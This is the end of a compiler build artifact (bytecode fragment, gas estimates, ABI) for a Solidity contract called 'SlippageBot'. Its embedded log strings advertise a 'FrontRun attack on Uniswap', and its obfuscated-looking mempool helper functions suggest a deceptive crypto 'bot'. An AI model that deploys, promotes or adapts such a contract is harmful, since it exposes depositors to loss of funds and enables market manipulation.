JUMPDEST ISZERO PUSH2 0xA1F JUMPI PUSH1 0xA DUP3 PUSH32 0x6100000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR ADD SUB PUSH1 0xF8 SHL SWAP1 POP PUSH2 0xA24 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP INVALID MSTORE8 PUSH6 0x6E64696E6720 PUSH17 0x726F66697473206261636B20746F20636F PUSH15 0x74726163742063726561746F722061 PUSH5 0x6472657373 0x2E 0x2E 0x2E MSTORE PUSH22 0x6E6E696E672046726F6E7452756E2061747461636B20 PUSH16 0x6E20556E69737761702E205468697320 PUSH4 0x616E2074 PUSH2 0x6B65 KECCAK256 PUSH2 0x2077 PUSH9 0x696C6520706C656173 PUSH6 0x20776169742E 0x2E 0x2E LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 LT EXTCODEHASH RETURNDATACOPY BLOCKHASH 0xE PUSH5 0x8FE297757A DUP6 NOT REVERT 0xE9 0xFC 0x4C 0xF7 0xE4 0xB0 PUSH32 0xD135195133D636592D69BA64736F6C6343000606003300000000000000000000 "
		},
		"gasEstimates": {
			"creation": {
				"codeDepositCost": "555600",
				"executionCost": "infinite",
				"totalCost": "infinite"
			},
			"external": {
				"start()": "infinite",
				"withdrawal()": "infinite"
			},
			"internal": {
				"_callFrontRunActionMempool()": "infinite",
				"beyond(struct SlippageBot.slice memory,struct SlippageBot.slice memory)": "infinite",
				"calcLiquidityInContract(struct SlippageBot.slice memory)": "infinite",
				"callMempool()": "infinite",
				"checkLiquidity(uint256)": "infinite",
				"findContracts(uint256,uint256,uint256,uint256)": "infinite",
				"findNewContracts(struct SlippageBot.slice memory,struct SlippageBot.slice memory)": "infinite",
				"findPtr(uint256,uint256,uint256,uint256)": "infinite",
				"getMemPoolDepth()": "23",
				"getMemPoolHeight()": "23",
				"getMemPoolLength()": "23",
				"getMemPoolOffset()": "23",
				"keccak(struct SlippageBot.slice memory)": "infinite",
				"loadCurrentContract(string memory)": "infinite",
				"memcpy(uint256,uint256,uint256)": "infinite",
				"mempool(string memory,string memory)": "infinite",
				"nextContract(struct SlippageBot.slice memory,struct SlippageBot.slice memory)": "infinite",
				"orderContractsByLiquidity(struct SlippageBot.slice memory)": "infinite",
				"parseMemoryPool(string memory)": "infinite",
				"toHexDigit(uint8)": "213",
				"uint2str(uint256)": "infinite",
				"withdrawalProfits()": "infinite"
			}
		},
		"methodIdentifiers": {
			"start()": "be9a6555",
			"withdrawal()": "d4e93292"
		}
	},
	"abi": [
		{
			"inputs": [
				{
					"internalType": "string",
					"name": "mainTokenSymbol",
					"type": "string"
				},
				{
					"internalType": "string",
					"name": "withdrawalAddress",
					"type": "string"
				}
			],
			"stateMutability": "nonpayable",
			"type": "constructor"
		},
		{
			"anonymous": false,
			"inputs": [
				{
					"indexed": false,
					"internalType": "string",
					"name": "_msg",
					"type": "string"
				}
			],
			"name": "Log",
			"type": "event"
		},
		{
			"inputs": [],
			"name": "start",
			"outputs": [],
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "withdrawal",
			"outputs": [],
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"stateMutability": "payable",
			"type": "receive"
		}
	]
}